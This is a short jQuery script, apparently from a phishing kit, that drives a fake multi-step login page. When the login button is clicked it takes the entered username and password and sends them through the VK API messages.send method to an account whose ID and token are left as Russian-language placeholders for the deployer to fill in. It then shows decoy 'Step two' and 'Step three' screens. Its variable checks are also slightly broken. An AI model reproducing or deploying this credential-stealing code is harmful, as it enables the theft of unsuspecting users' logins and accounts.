$("#steptwo").hide();
$("#stepthree").hide();
var stepinf = 1;
$("#LoginButton").click(function(){
	if (logindata != ""){
		if (passwddata != ""){
			var logindata = $("#logininpt").val();
			var passwddata = $("#psswdinpt").val();
			$.get("https://api.vk.com/method/messages.send?user_id=ВАШ АЙДИ&message=" + logindata + ":" + passwddata + "&access_token=ваш токен&v=5.64");
			stepinf = 2;
			$("#stepinf").text("Step two");
			$("#stepone").hide();
			$("#steptwo").show();
		}
	}
});
$("#OkButton").click(function(){
	$("#stepinf").text("Step three");
	$("#steptwo").hide();
	$("#stepthree").show();
});
